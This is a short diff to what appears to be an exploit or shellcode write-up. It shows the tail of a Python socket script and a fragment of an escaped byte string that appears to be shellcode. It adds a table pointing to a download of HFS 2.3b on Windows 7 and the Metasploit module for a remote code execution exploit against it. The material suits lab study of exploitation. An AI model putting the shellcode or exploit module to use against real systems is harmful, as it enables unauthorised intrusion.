@@ -79,3 +79,8 @@ s.close()
 "\x4f\x5f\x0e\x93\xdd\xfa\xbc\x45\x47\x7d\x24\xb9\xa8\x3b\xa6"
 ```
 
+## Vulnerable Application 
+
+Vulnerable Application | OS | Metasploit
+--- | --- | ---
+[HFS](https://liquidtelecom.dl.sourceforge.net/project/hfs/HFS/2.3b/hfs2.3b.zip) | Windows 7 | `use exploit/windows/http/rejetto_hfs_exec`
